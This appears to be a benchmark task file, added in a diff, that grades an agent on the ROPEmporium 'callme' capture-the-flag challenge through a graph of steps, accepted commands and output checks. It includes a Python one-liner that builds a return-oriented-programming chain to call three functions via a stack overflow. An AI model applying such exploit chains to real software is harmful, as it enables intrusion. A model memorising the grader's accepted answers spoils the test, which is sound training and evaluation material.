@@ -1,0 +1,115 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: ropemporium_callme
+  name: ROPEmporium callme
+  description: Use the PLT and a suitable argument-loading gadget to call callme_one(),
+    callme_two(), and callme_three() in order with the required arguments.
+attacker_context:
+  user: ctf-player
+  access:
+    method: local_shell
+    credentials: null
+  target:
+    host: local
+    path: <path-to-challenge-binary>
+    architecture: <challenge-architecture>
+    os: linux
+goal:
+  node: node4
+irrelevant_commands:
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- man
+- man ropper
+- python3
+- python
+- bash
+- sh
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Overflow offset identified
+- id: node1
+  type: state
+  label: callme PLT entries identified
+- id: node2
+  type: state
+  label: Argument-loading gadget identified
+- id: node3
+  type: state
+  label: Ordered multi-call payload crafted
+- id: node4
+  type: state
+  label: Flag printed
+edges:
+- action: determine_overflow_offset
+  accepted_commands:
+  - gdb -q ./callme
+  - ragg2 -P 200 -r > pattern.txt && ./callme < pattern.txt
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge0
+  from: start
+  to: node0
+- action: locate_callme_functions_in_plt
+  accepted_commands:
+  - objdump -d callme | grep callme_
+  - rabin2 -i callme | grep callme_
+  - readelf -Ws callme | grep callme_
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*callme_one.*callme_two.*callme_three.*
+    stderr_regex: .*
+  id: edge1
+  from: node0
+  to: node1
+- action: find_multi_register_loading_gadget
+  accepted_commands:
+  - ROPgadget --binary callme | grep "pop rdi"
+  - ROPgadget --binary callme | grep "pop rsi"
+  - ropper --file callme --search "pop rdi; pop rsi; pop rdx; ret"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*pop.*
+    stderr_regex: .*
+  id: edge2
+  from: node1
+  to: node2
+- action: craft_payload_for_ordered_function_calls
+  accepted_commands:
+  - python3 -c "from struct import pack; import sys; pad=b'A'*40; pop3=0xPOP_RDI_RSI_RDX_RET;
+    a1=0xdeadbeefdeadbeef; a2=0xcafebabecafebabe; a3=0xd00df00dd00df00d; callme_one=0xCALLME_ONE_PLT;
+    callme_two=0xCALLME_TWO_PLT; callme_three=0xCALLME_THREE_PLT; chain=pad + pack('<Q',
+    pop3)+pack('<Q', a1)+pack('<Q', a2)+pack('<Q', a3)+pack('<Q', callme_one)+pack('<Q',
+    pop3)+pack('<Q', a1)+pack('<Q', a2)+pack('<Q', a3)+pack('<Q', callme_two)+pack('<Q',
+    pop3)+pack('<Q', a1)+pack('<Q', a2)+pack('<Q', a3)+pack('<Q', callme_three); sys.stdout.buffer.write(chain)"
+    > payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: .*
+  id: edge3
+  from: node2
+  to: node3
+- action: execute_payload_and_call_callme_triplet
+  accepted_commands:
+  - ./callme < payload.bin
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*flag.*
+    stderr_regex: .*
+  id: edge4
+  from: node3
+  to: node4
